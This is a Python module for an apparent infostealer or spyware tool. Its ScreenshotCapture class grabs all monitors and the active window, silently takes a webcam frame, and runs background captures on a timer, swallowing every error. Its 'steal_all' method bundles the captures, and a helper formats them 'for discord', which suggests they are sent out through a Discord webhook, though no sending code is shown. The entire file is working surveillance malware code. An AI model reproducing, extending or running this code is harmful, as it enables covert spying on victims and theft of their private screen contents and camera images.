import os
import sys
import time
import json
import base64
import threading
import tempfile
from datetime import datetime
from typing import Dict, List, Any, Optional, Tuple

try:
    import mss
    import mss.tools
except ImportError:
    pass

try:
    from PIL import Image
    import PIL.ImageGrab
except ImportError:
    pass

class ScreenshotCapture:
    def __init__(self):
        self.temp_dir = tempfile.gettempdir()
        self.screenshots = []
        self.running = False
        self.capture_thread = None
        self.lock = threading.Lock()
        
    def capture_screen_mss(self):
        try:
            with mss.mss() as sct:
                # Capture all monitors
                monitors = sct.monitors
                
                screenshots = []
                
                for i, monitor in enumerate(monitors):
                    if i == 0:
                        continue  # Skip the "all monitors" pseudo-monitor
                    
                    screenshot = sct.grab(monitor)
                    
                    # Convert to PNG
                    png_data = mss.tools.to_png(screenshot.rgb, screenshot.size)
                    
                    screenshots.append({
                        "monitor": i,
                        "width": screenshot.width,
                        "height": screenshot.height,
                        "data": base64.b64encode(png_data).decode(),
                        "timestamp": datetime.now().isoformat()
                    })
                
                return screenshots
        except:
            return []
    
    def capture_screen_pil(self):
        try:
            screenshot = PIL.ImageGrab.grab()
            
            # Save to bytes
            import io
            buffer = io.BytesIO()
            screenshot.save(buffer, format="PNG")
            png_data = buffer.getvalue()
            
            return [{
                "monitor": 1,
                "width": screenshot.width,
                "height": screenshot.height,
                "data": base64.b64encode(png_data).decode(),
                "timestamp": datetime.now().isoformat()
            }]
        except:
            return []
    
    def capture_screen(self):
        screenshots = []
        
        # Try mss first
        try:
            screenshots = self.capture_screen_mss()
        except:
            pass
        
        # Fallback to PIL
        if not screenshots:
            try:
                screenshots = self.capture_screen_pil()
            except:
                pass
        
        return screenshots
    
    def capture_active_window(self):
        try:
            import win32gui
            import win32ui
            import win32con
            from PIL import Image
            
            # Get active window
            hwnd = win32gui.GetForegroundWindow()
            
            # Get window rect
            left, top, right, bottom = win32gui.GetWindowRect(hwnd)
            width = right - left
            height = bottom - top
            
            # Get window DC
            hwnd_dc = win32gui.GetWindowDC(hwnd)
            mfc_dc = win32ui.CreateDCFromHandle(hwnd_dc)
            save_dc = mfc_dc.CreateCompatibleDC()
            
            # Create bitmap
            bitmap = win32ui.CreateBitmap()
            bitmap.CreateCompatibleBitmap(mfc_dc, width, height)
            save_dc.SelectObject(bitmap)
            
            # Copy window contents
            import ctypes
            ctypes.windll.user32.PrintWindow(hwnd, save_dc.GetSafeHdc(), 2)
            
            # Convert to PIL Image
            bmp_info = bitmap.GetInfo()
            bmp_data = bitmap.GetBitmapBits(True)
            
            image = Image.frombuffer(
                'RGB',
                (bmp_info['bmWidth'], bmp_info['bmHeight']),
                bmp_data, 'raw', 'BGRX', 0, 1
            )
            
            # Save to bytes
            import io
            buffer = io.BytesIO()
            image.save(buffer, format="PNG")
            png_data = buffer.getvalue()
            
            # Cleanup
            win32gui.DeleteObject(bitmap.GetHandle())
            save_dc.DeleteDC()
            mfc_dc.DeleteDC()
            win32gui.ReleaseDC(hwnd, hwnd_dc)
            
            window_title = win32gui.GetWindowText(hwnd)
            
            return [{
                "type": "active_window",
                "window_title": window_title,
                "width": width,
                "height": height,
                "data": base64.b64encode(png_data).decode(),
                "timestamp": datetime.now().isoformat()
            }]
        except:
            return []
    
    def capture_webcam(self):
        try:
            import cv2
            
            # Try to open webcam
            cap = cv2.VideoCapture(0)
            
            if cap.isOpened():
                ret, frame = cap.read()
                
                if ret:
                    # Convert to JPEG
                    import io
                    success, buffer = cv2.imencode('.jpg', frame)
                    
                    if success:
                        jpg_data = buffer.tobytes()
                        
                        cap.release()
                        
                        return [{
                            "type": "webcam",
                            "data": base64.b64encode(jpg_data).decode(),
                            "timestamp": datetime.now().isoformat()
                        }]
                
                cap.release()
        except:
            pass
        
        return []
    
    def save_screenshots_to_disk(self, screenshots, output_dir=None):
        if output_dir is None:
            output_dir = os.path.join(self.temp_dir, "screenshots")
        
        os.makedirs(output_dir, exist_ok=True)
        
        saved_files = []
        
        for screenshot in screenshots:
            try:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"screenshot_{timestamp}_{screenshot.get('monitor', 'unknown')}.png"
                file_path = os.path.join(output_dir, filename)
                
                png_data = base64.b64decode(screenshot.get("data", ""))
                
                with open(file_path, "wb") as f:
                    f.write(png_data)
                
                saved_files.append(file_path)
            except:
                pass
        
        return saved_files
    
    def start_periodic_capture(self, interval_seconds=300):
        def capture_loop():
            while self.running:
                screenshots = self.capture_screen()
                
                with self.lock:
                    self.screenshots.extend(screenshots)
                
                time.sleep(interval_seconds)
        
        self.running = True
        self.capture_thread = threading.Thread(target=capture_loop, daemon=True)
        self.capture_thread.start()
    
    def stop_periodic_capture(self):
        self.running = False
        
        if self.capture_thread:
            self.capture_thread.join(timeout=5)
    
    def get_screenshots(self):
        with self.lock:
            return self.screenshots
    
    def clear_screenshots(self):
        with self.lock:
            self.screenshots = []
    
    def format_screenshots_for_discord(self, screenshots, limit=10):
        formatted = []
        
        for screenshot in screenshots[:limit]:
            formatted.append({
                "monitor": screenshot.get("monitor", "unknown"),
                "width": screenshot.get("width", 0),
                "height": screenshot.get("height", 0),
                "timestamp": screenshot.get("timestamp", ""),
                "data_size": len(screenshot.get("data", ""))
            })
        
        return formatted
    
    def compress_screenshot(self, png_data, quality=50):
        try:
            import io
            from PIL import Image
            
            # Convert PNG to JPEG for compression
            image = Image.open(io.BytesIO(png_data))
            
            buffer = io.BytesIO()
            image.save(buffer, format="JPEG", quality=quality)
            jpg_data = buffer.getvalue()
            
            return jpg_data
        except:
            return png_data
    
    def capture_and_save(self):
        screenshots = self.capture_screen()
        
        saved_files = self.save_screenshots_to_disk(screenshots)
        
        return {
            "screenshots": screenshots,
            "saved_files": saved_files
        }
    
    def steal_all(self):
        screenshots = self.capture_screen()
        
        # Also capture active window
        active_window = self.capture_active_window()
        screenshots.extend(active_window)
        
        return {
            "total_screenshots": len(screenshots),
            "screenshots": screenshots,
            "timestamp": datetime.now().isoformat()
        }

if __name__ == "__main__":
    capture = ScreenshotCapture()
    data = capture.steal_all()
    print(f"Total screenshots captured: {data['total_screenshots']}")
    print(json.dumps(capture.format_screenshots_for_discord(data['screenshots']), indent=2))